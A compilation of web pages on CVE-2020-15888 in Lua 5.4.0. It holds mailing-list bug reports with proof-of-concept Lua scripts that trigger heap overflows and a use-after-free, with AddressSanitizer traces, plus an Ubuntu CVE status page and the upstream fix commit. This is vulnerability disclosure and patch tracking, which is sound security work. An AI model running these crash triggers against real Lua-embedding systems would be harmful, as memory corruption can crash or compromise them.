=== Content from lua-users.org_70680aa3_20250119_122101.html ===


[[Date Prev](msg00078.html)][[Date Next](msg00080.html)][[Thread Prev](msg00097.html)][[Thread Next](msg00081.html)]
[[Date Index](index.html#00079)]
[[Thread Index](threads.html#00079)]

* **Subject**: **heap-buffer-overflow in luaD\_pretailcall**
* **From**: Rui Zhong <reversezr33@[...](/cgi-bin/echo.cgi?gmail.com)>
* **Date**: Mon, 6 Jul 2020 22:10:29 -0400

---

Hi,
We found a heap-buffer-overflow in Lua (Lua 5.4.0  Copyright (C) 1994-2020 Lua.org, PUC-Rio)Try following PoC-------------------------function
crash (  )
do
    function errfunc (  ) end coro =
        function (  )print ( xpcall ( test, errfunc ) )
        print ( setmetatable ( { }
                               , { \_\_gc = function (  )asserty = k + 1 end }
                             ) )end coro (  )return load ( string.
                                     dump ( function
                                            ( p8, p9, p10, p11, p12, p13,
                                                    p14, p15, p16, p17, p18,
                                                    p19, p20, p21, p22, p23,
                                                    p24, p25, p26, p5, p6, p7,
                                                    p8, p9, p10, p11, p12, p13,
                                                    p14, p15, p16, p17, p18,
                                                    p19 ) end ) ) (  )end end
                                     for i
                                     = 1, 5
                                       do
                                           crash (  )end
-------------------------Compile Lua with Address sanitizer and run above PoC.Asan log:================================================================
==5190==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6160000017e8 at pc 0x000000414661 bp 0x7ffd48797200 sp 0x7ffd487971f0
WRITE of size 1 at 0x6160000017e8 thread T0
    #0 0x414660 in luaD\_pretailcall (/home/yongheng/lua\_asan/lua+0x414660)
    #1 0x4429b6 in luaV\_execute (/home/yongheng/lua\_asan/lua+0x4429b6)
    #2 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)
    #3 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)
    #4 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)
    #5 0x415d70 in luaD\_pcall (/home/yongheng/lua\_asan/lua+0x415d70)
    #6 0x40bd47 in lua\_pcallk (/home/yongheng/lua\_asan/lua+0x40bd47)
    #7 0x4051e6 in docall (/home/yongheng/lua\_asan/lua+0x4051e6)
    #8 0x40664d in pmain (/home/yongheng/lua\_asan/lua+0x40664d)
    #9 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)
    #10 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)
    #11 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)
    #12 0x415d70 in luaD\_pcall (/home/yongheng/lua\_asan/lua+0x415d70)
    #13 0x40bd47 in lua\_pcallk (/home/yongheng/lua\_asan/lua+0x40bd47)
    #14 0x4049b4 in main (/home/yongheng/lua\_asan/lua+0x4049b4)
    #15 0x7f6aeba2282f in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x2082f)
    #16 0x405008 in \_start (/home/yongheng/lua\_asan/lua+0x405008)
================================================================

Best,Yongheng and Rui

---

* **Follow-Ups**:
  + **[Re: heap-buffer-overflow in luaD\_pretailcall](msg00081.html),** *Roberto Ierusalimschy*
  + **[Re: heap-buffer-overflow in luaD\_pretailcall](msg00092.html),** *Andrew Gierth*

* Prev by Date:
  **[heap-buffer-overflow in getobjname](msg00078.html)**
* Next by Date:
  **[Re: Heap overflow in luaH\_get](msg00080.html)**
* Previous by thread:
  **[Re: heap-buffer-overflow in getobjname](msg00097.html)**
* Next by thread:
  **[Re: heap-buffer-overflow in luaD\_pretailcall](msg00081.html)**
* Index(es):
  + [**Date**](index.html#00079)
  + [**Thread**](threads.html#00079)



=== Content from lua-users.org_5bec1834_20250119_122101.html ===


[[Date Prev](msg00052.html)][[Date Next](msg00054.html)][[Thread Prev](msg00070.html)][[Thread Next](msg00059.html)]
[[Date Index](index.html#00053)]
[[Thread Index](threads.html#00053)]

* **Subject**: **Heap use after free in luaD\_call**
* **From**: Yongheng Chen <changochen1@[...](/cgi-bin/echo.cgi?gmail.com)>
* **Date**: Mon, 6 Jul 2020 00:31:52 -0400

---

| Hi,    We found a heap use after free in lua. Here’s the details:    Version:  Lua 5.4.0, git hash c33b1728aeb7dfeec4013562660e07d32697aa6b    POC:  function errfunc() string.rep('mod', 512) end  function test()  load(function()(function() printload(  xpcall(test, function() print(xpcall(test, errfunc)) end)) end)() end)  end(function() print(xpcall(test, errfunc)) end)()    How to reproduce:  ./lua poc.lua    Stack dump:  =================================================================  ==16339==ERROR: AddressSanitizer: heap-use-after-free on address 0x606000106afc at pc 0x000000414f64 bp 0x7ffd2b8acdb0 sp 0x7ffd2b8acda0  WRITE of size 2 at 0x606000106afc thread T0  #0 0x414f63 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414f63)  #1 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #2 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #3 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #4 0x40baf4 in lua\_callk (/home/yongheng/lua\_asan/lua+0x40baf4)  #5 0x4562fb in generic\_reader (/home/yongheng/lua\_asan/lua+0x4562fb)  #6 0x447cb8 in luaZ\_fill (/home/yongheng/lua\_asan/lua+0x447cb8)  #7 0x412594 in f\_parser (/home/yongheng/lua\_asan/lua+0x412594)  #8 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)  #9 0x415d70 in luaD\_pcall (/home/yongheng/lua\_asan/lua+0x415d70)  #10 0x41611c in luaD\_protectedparser (/home/yongheng/lua\_asan/lua+0x41611c)  #11 0x40c1d4 in lua\_load (/home/yongheng/lua\_asan/lua+0x40c1d4)  #12 0x456a92 in luaB\_load (/home/yongheng/lua\_asan/lua+0x456a92)  #13 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)  #14 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #15 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #16 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)  #17 0x415d70 in luaD\_pcall (/home/yongheng/lua\_asan/lua+0x415d70)  #18 0x40bd47 in lua\_pcallk (/home/yongheng/lua\_asan/lua+0x40bd47)  #19 0x45672e in luaB\_xpcall (/home/yongheng/lua\_asan/lua+0x45672e)….    Found by: Yongheng Chen and Rui Zhong    Best,  Yongheng |
| --- |

---

* **Follow-Ups**:
  + **[Re: Heap use after free in luaD\_call](msg00059.html),** *Roberto Ierusalimschy*

* Prev by Date:
  **[Stack overflow in luaO\_pushvfstring](msg00052.html)**
* Next by Date:
  **[Heap overflow in luaT\_adjustvarargs](msg00054.html)**
* Previous by thread:
  **[Re: Stack overflow in luaO\_pushvfstring](msg00070.html)**
* Next by thread:
  **[Re: Heap use after free in luaD\_call](msg00059.html)**
* Index(es):
  + [**Date**](index.html#00053)
  + [**Thread**](threads.html#00053)



=== Content from ubuntu.com_0e1c1c96_20250119_135945.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2020-15888

Publication date 21 July 2020

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/03ac6f86-CVE-Priority-icon-Low.svg)

**Low**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg)

**8.8 · High**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Notes](#notes)
* [Severity score breakdown](#impact-score)
* [References](#references)

Lua through 5.4.0 mishandles the interaction between stack resizes and
garbage collection, leading to a heap-based buffer overflow, heap-based
buffer over-read, or use-after-free.

[Read the notes from the security team](#notes)

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| lua5.1 | 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not affected |
| lua5.2 | 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not affected |
| lua5.3 | 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |
| lua5.4 | 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Ignored end of life |
| 20.04 LTS focal | Not in release |
| 18.04 LTS bionic | Not in release |
| 16.04 LTS xenial | Not in release |
| 14.04 LTS trusty | Not in release |
| lua50 | 22.04 LTS jammy | Not in release |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 18.04 LTS bionic | Not affected |
| 16.04 LTS xenial | Not affected |
| 14.04 LTS trusty | Not in release |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)
* [Patch details](#patch-details)

## Notes

---

### [mdeslaur](https://launchpad.net/~mdeslaur)

couldn't reproduce on lua earlier than 5.4. No indication that
earlier versions are vulnerable. Marking not-affected.

### Patch details

For informational purposes only. We recommend not to cherry-pick updates. [How can I get the fixes?](/security/cves/about#security)

| Package | Patch details |
| --- | --- |
| lua5.4 | * Upstream:   [6298903](https://github.com/lua/lua/commit/6298903e35217ab69c279056f925fb72900ce0b7) * Upstream:   [eb41999](https://github.com/lua/lua/commit/eb41999461b6f428186c55abd95f4ce1a76217d5) |

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 8.8 · High |
| Attack vector | Network |
| Attack complexity | Low |
| Privileges required | None |
| User interaction | Required |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity impact | High |
| Availability impact | High |
| Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15888)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-15888)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2020-15888)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2020-15888)

### Other references

* <http://lua-users.org/lists/lua-l/2020-07/msg00053.html>
* <http://lua-users.org/lists/lua-l/2020-07/msg00054.html>
* <http://lua-users.org/lists/lua-l/2020-07/msg00071.html>
* <http://lua-users.org/lists/lua-l/2020-07/msg00079.html>
* <https://www.cve.org/CVERecord?id=CVE-2020-15888>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lua-users.org_88dcb459_20250119_122101.html ===


[[Date Prev](msg00053.html)][[Date Next](msg00055.html)][[Thread Prev](msg00308.html)][[Thread Next](msg00094.html)]
[[Date Index](index.html#00054)]
[[Thread Index](threads.html#00054)]

* **Subject**: **Heap overflow in luaT\_adjustvarargs**
* **From**: Yongheng Chen <changochen1@[...](/cgi-bin/echo.cgi?gmail.com)>
* **Date**: Mon, 6 Jul 2020 00:41:39 -0400

---

| Hi,    We found a heap overflow in lua. Here’s the details:    Version:  Lua 5.4.0, git hash c33b1728aeb7dfeec4013562660e07d32697aa6b    POC:  do  function errfunc(p16, p17, p18, p19, p20, p21, p22, p23, p24, p25, p26, p27,  p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39,  p40, p41, p42, p43, p44, p45, p46, p48, p49, p50, ...) a9  'fail' end coroutine.wrap(function() xpcall(  test,  function() do setmetatable({},  { \_\_gc = function() if k < 2 then end end })  end end) xpcall(test, errfunc) end)() end      How to reproduce:  ./lua poc.lua    Stack dump:  =================================================================  ==12863==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61d000001370 at pc 0x000000434ef4 bp 0x7ffeca5e4290 sp 0x7ffeca5e4280  WRITE of size 8 at 0x61d000001370 thread T0  #0 0x434ef3 in luaT\_adjustvarargs (/home/yongheng/lua\_asan/lua+0x434ef3)  #1 0x43a6fa in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43a6fa)  #2 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #3 0x4112ae in luaG\_errormsg (/home/yongheng/lua\_asan/lua+0x4112ae)  #4 0x411491 in luaG\_runerror (/home/yongheng/lua\_asan/lua+0x411491)  #5 0x411595 in luaG\_typeerror (/home/yongheng/lua\_asan/lua+0x411595)  #6 0x4138bc in luaD\_tryfuncTM (/home/yongheng/lua\_asan/lua+0x4138bc)  #7 0x41480d in luaD\_call (/home/yongheng/lua\_asan/lua+0x41480d)  #8 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #9 0x415194 in luaD\_callnoyield (/home/yongheng/lua\_asan/lua+0x415194)  #10 0x4112ae in luaG\_errormsg (/home/yongheng/lua\_asan/lua+0x4112ae)  #11 0x411491 in luaG\_runerror (/home/yongheng/lua\_asan/lua+0x411491)  #12 0x411595 in luaG\_typeerror (/home/yongheng/lua\_asan/lua+0x411595)  #13 0x4138bc in luaD\_tryfuncTM (/home/yongheng/lua\_asan/lua+0x4138bc)  #14 0x41480d in luaD\_call (/home/yongheng/lua\_asan/lua+0x41480d)  #15 0x40bfb3 in lua\_pcallk (/home/yongheng/lua\_asan/lua+0x40bfb3)  #16 0x45672e in luaB\_xpcall (/home/yongheng/lua\_asan/lua+0x45672e)  #17 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)  #18 0x43d4cc in luaV\_execute (/home/yongheng/lua\_asan/lua+0x43d4cc)  #19 0x4142f2 in unroll (/home/yongheng/lua\_asan/lua+0x4142f2)  #20 0x4127d0 in luaD\_rawrunprotected (/home/yongheng/lua\_asan/lua+0x4127d0)  #21 0x4157f2 in lua\_resume (/home/yongheng/lua\_asan/lua+0x4157f2)  #22 0x469fa4 in auxresume (/home/yongheng/lua\_asan/lua+0x469fa4)  #23 0x46a4da in luaB\_auxwrap (/home/yongheng/lua\_asan/lua+0x46a4da)  #24 0x414de1 in luaD\_call (/home/yongheng/lua\_asan/lua+0x414de1)      Found by: Yongheng Chen and Rui Zhong    Best,  Yongheng |
| --- |

---

* **Follow-Ups**:
  + **[Re: Heap overflow in luaT\_adjustvarargs](msg00094.html),** *Andrew Gierth*

* Prev by Date:
  **[Heap use after free in luaD\_call](msg00053.html)**
* Next by Date:
  **[Re: [ANN] Ravi (a Lua dialect) 1.0 Beta-4 Release with JIT compilation support](msg00055.html)**
* Previous by thread:
  **[Re: Heap use after free in luaD\_call](msg00308.html)**
* Next by thread:
  **[Re: Heap overflow in luaT\_adjustvarargs](msg00094.html)**
* Index(es):
  + [**Date**](index.html#00054)
  + [**Thread**](threads.html#00054)



=== Content from github.com_13f0cd3f_20250119_122103.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flua%2Flua%2Fcommit%2F6298903e35217ab69c279056f925fb72900ce0b7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flua%2Flua%2Fcommit%2F6298903e35217ab69c279056f925fb72900ce0b7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=lua%2Flua)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[lua](/lua)
/
**[lua](/lua/lua)**
Public

* [Notifications](/login?return_to=%2Flua%2Flua) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Flua%2Flua)
* [Star
   8.7k](/login?return_to=%2Flua%2Flua)

* [Code](/lua/lua)
* [Pull requests
  0](/lua/lua/pulls)
* [Actions](/lua/lua/actions)
* [Security](/lua/lua/security)
* [Insights](/lua/lua/pulse)

Additional navigation options

* [Code](/lua/lua)
* [Pull requests](/lua/lua/pulls)
* [Actions](/lua/lua/actions)
* [Security](/lua/lua/security)
* [Insights](/lua/lua/pulse)

## Commit

[Permalink](/lua/lua/commit/6298903e35217ab69c279056f925fb72900ce0b7)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Keep minimum size when shrinking a stack

[Browse files](/lua/lua/tree/6298903e35217ab69c279056f925fb72900ce0b7)
Browse the repository at this point in the history

```
When shrinking a stack (during GC), do not make it smaller than the
initial stack size.
```

* Loading branch information

[![@roberto-ieru](https://avatars.githubusercontent.com/u/16293687?s=40&v=4)](/roberto-ieru)

[roberto-ieru](/lua/lua/commits?author=roberto-ieru "View all commits by roberto-ieru")
committed
Jul 6, 2020

1 parent
[b57574d](/lua/lua/commit/b57574d6fb9071b2f8f261b32c9378ed72db7023)

commit 6298903

Showing
**1 changed file**
with
**2 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

5 changes: 2 additions & 3 deletions

5
[ldo.c](#diff-a1e6f0be3689739fa1e5707427e78d792c7f6a333bed95fd05c4382d60bda7c4 "ldo.c")

Show comments

[View file](/lua/lua/blob/6298903e35217ab69c279056f925fb72900ce0b7/ldo.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -245,13 +245,12 @@ static int stackinuse (lua\_State \*L) { |
|  |  |  |
|  |  | void luaD\_shrinkstack (lua\_State \*L) { |
|  |  | int inuse = stackinuse(L); |
|  |  | int goodsize = inuse + (inuse / 8) + 2\*EXTRA\_STACK; |
|  |  | int goodsize = inuse + BASIC\_STACK\_SIZE; |
|  |  | if (goodsize > LUAI\_MAXSTACK) |
|  |  | goodsize = LUAI\_MAXSTACK; /\* respect stack limit \*/ |
|  |  | /\* if thread is currently not handling a stack overflow and its |
|  |  | good size is smaller than current size, shrink its stack \*/ |
|  |  | if (inuse <= (LUAI\_MAXSTACK - EXTRA\_STACK) && |
|  |  | goodsize < L->stacksize) |
|  |  | if (inuse <= (LUAI\_MAXSTACK - EXTRA\_STACK) && goodsize < L->stacksize) |
|  |  | luaD\_reallocstack(L, goodsize, 0); /\* ok if that fails \*/ |
|  |  | else /\* don't change stack \*/ |
|  |  | condmovestack(L,{},{}); /\* (change only for debugging) \*/ |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 4 comments on commit `6298903`

[![@sonicgemini](https://avatars.githubusercontent.com/u/1742656?s=80&v=4)](/sonicgemini)

Copy link

### @sonicgemini **[sonicgemini](/sonicgemini)** commented on `[6298903](/lua/lua/commit/6298903e35217ab69c279056f925fb72900ce0b7)` [Jul 27, 2020](#commitcomment-40921252)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

wonder if lua 5.3.5 has the same issue?

Sorry, something went wrong.

All reactions

[![@BrunoVernay](https://avatars.githubusercontent.com/u/132261?s=80&v=4)](/BrunoVernay)

Copy link

### @BrunoVernay **[BrunoVernay](/BrunoVernay)** commented on `[6298903](/lua/lua/commit/6298903e35217ab69c279056f925fb72900ce0b7)` [Apr 21, 2021](#commitcomment-49795557)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

At least the CVE <https://nvd.nist.gov/vuln/detail/CVE-2020-15888> says all versions are impacted up to (including) 5.4.0.

What is more concerning is whether this commit alone fixes the CVE or if the other commit referenced in the CVE: [eb41999](https://github.com/lua/lua/commit/eb41999461b6f428186c55abd95f4ce1a76217d5) is also required ???

Because only this commit has been backported to 5.3.6, not the other one. Since there is no 5.3.7 to clearly fix this vulnerability, the security status is uncertain

Sorry, something went wrong.

All reactions

[![@roberto-ieru](https://avatars.githubusercontent.com/u/16293687?s=80&v=4)](/roberto-ieru)

Copy link

Contributor

Author

### @roberto-ieru **[roberto-ieru](/roberto-ieru)** commented on `[6298903](/lua/lua/commit/6298903e35217ab69c279056f925fb72900ce0b7)` [Apr 21, 2021](#commitcomment-49811752) via email

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

 At least the CVE <https://nvd.nist.gov/vuln/detail/CVE-2020-15888> says all versions are impacted up to (including) 5.4.0.
[...]
As described in the "About" this repository, "Send any issue to the Lua
mailing list".
Thanks,
…
-- Roberto

Sorry, something went wrong.

All reactions

[![@samboy](https://avatars.githubusercontent.com/u/6597080?s=80&v=4)](/samboy)

Copy link

